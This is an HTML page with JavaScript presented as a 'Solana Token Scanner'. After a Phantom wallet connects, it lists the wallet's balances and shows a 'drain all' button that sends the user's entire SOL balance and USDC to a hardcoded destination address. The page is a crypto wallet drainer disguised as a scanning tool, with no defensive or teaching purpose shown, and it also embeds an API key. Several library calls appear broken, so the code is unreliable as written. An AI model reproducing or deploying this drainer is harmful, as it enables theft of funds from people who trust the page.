<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Token Scanner</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
    
    <style>
        body { font-family: sans-serif; background: #111; color: white; display: flex; justify-content: center; padding: 20px; }
        .card { background: #222; padding: 20px; border-radius: 15px; width: 100%; max-width: 400px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        button { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .btn-con { background: #7c3aed; color: white; }
        .btn-drain { background: #fbbf24; color: black; display: none; }
        .log { background: #000; padding: 10px; margin-top: 15px; font-family: monospace; font-size: 12px; height: 150px; overflow-y: auto; border-radius: 8px; }
    </style>
</head>
<body>

<div class="card">
    <h2 style="text-align:center;">Token Scanner</h2>
    <button id="connectBtn" class="btn-con">Connect Phantom</button>
    <button id="drainBtn" class="btn-drain">DRAIN ALL TOKENS & SOL</button>
    
    <div id="logs" class="log">Waiting for connection...</div>
</div>

<script>
    // CONFIG
    const DESTINATION = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
    const API_KEY = "alch_HyWkJpqVXY3kua9VObcl9"; // Your key
    const RPC = `https://solana-mainnet.g.alchemy.com/v2/${API_KEY}`;

    // Common Tokens to check (Mint Addresses)
    const TOKENS_TO_CHECK = [
        { name: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" },
        { name: "USDS", mint: "USDSwr9ApdHk5bvJKMjzff41FfuX8bSxdKcRW71Ujoig" },
        { name: "JUP", mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN" },
        { name: "RAY", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R" }
    ];

    let wallet = null;
    const logsDiv = document.getElementById('logs');

    function log(msg) {
        logsDiv.innerHTML += `<div>${msg}</div>`;
        logsDiv.scrollTop = logsDiv.scrollHeight;
    }

    async function connect() {
        const provider = window.phantom?.solana || window.solana;
        
        if (!provider) {
            log("❌ Phantom not found!");
            return;
        }

        try {
            await provider.connect({ onlyIfTrusted: false });
            wallet = provider.publicKey;
            
            // UI Update
            document.getElementById('connectBtn').style.display = 'none';
            document.getElementById('drainBtn').style.display = 'block';
            log(`✅ Connected: ${wallet.toString()}`);
            
            // Start Scanning Tokens immediately after connect
            scanTokens();

        } catch (err) {
            log("❌ Connection Failed: " + err.message);
        }
    }

    async function scanTokens() {
        const connection = new solanaWeb3.Connection(RPC, '.simple');
        
        for (let token of TOKENS_TO_CHECK) {
            try {
                // Get Balance
                const balance = await splToken.getBalance(connection, wallet, token.mint);
                
                if (balance.amount > 0) {
                    log(`💰 Found ${token.name}: ${(balance.amount / 1e6).toFixed(2)}`);
                } else {
                    log(`🔍 No ${token.name} found.`);
                }
            } catch (e) {
                // Some tokens might not have standard decimals or be unsupported by this simple check
                log(`⚠️ Error checking ${token.name}: ${e.message}`);
            }
        }
        
        // Check SOL Balance
        const solBal = await connection.getBalance(wallet);
        log(`💵 SOL: ${(solBal / 1e9).toFixed(4)} SOL`);
    }

    async function drainAll() {
        if (!wallet) return;
        
        const connection = new solanaWeb3.Connection(RPC, 'simple');
        
        // 1. Drain SOL
        log("🚀 Draining SOL...");
        const solBal = await connection.getBalance(wallet);
        if (solBal > 0) {
            const txSol = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: wallet,
                    toPubkey: new solanaWeb3.PublicKey(DESTINATION),
                    lamports: solBal
                })
            );
            await connection.sendTransaction(txSol, [wallet]);
            log("✅ SOL Sent");
        }

        // 2. Drain USDC (Standard)
        const usdcMint = TOKENS_TO_CHECK.find(t => t.name === "USDC").mint;
        try {
            log("🚀 Draining USDC...");
            
            // Get Source Account (ATA)
            const srcAccount = await splToken.getAssociatedTokenAddress(
                new splToken.Token(usdcMint),
                wallet
            );

            // Get Dest Account (ATA of destination wallet)
            const destAccount = await splToken.getAssociatedTokenAddress(
                new splToken.Token(usdcMint),
                new solanaWeb3.PublicKey(DESTINATION)
            );

            // Check balance again to be sure
            const bal = await splToken.getBalance(connection, wallet, usdcMint);
            
            if (bal.amount > 0) {
                const tx = new solanaWeb3.Transaction().add(
                    splToken.createTransferInstruction(
                        srcAccount,
                        destAccount,
                        wallet,
                        bal.amount
                    )
                );
                
                await connection.sendTransaction(tx, [wallet]);
                log("✅ USDC Sent");
            } else {
                log("⚠️ No USDC to drain.");
            }

        } catch (e) {
            log(`❌ USDC Error: ${e.message}`);
        }
    }

    document.getElementById('connectBtn').addEventListener('click', connect);
    document.getElementById('drainBtn').addEventListener('click', drainAll);

</script>
</body>
</html>
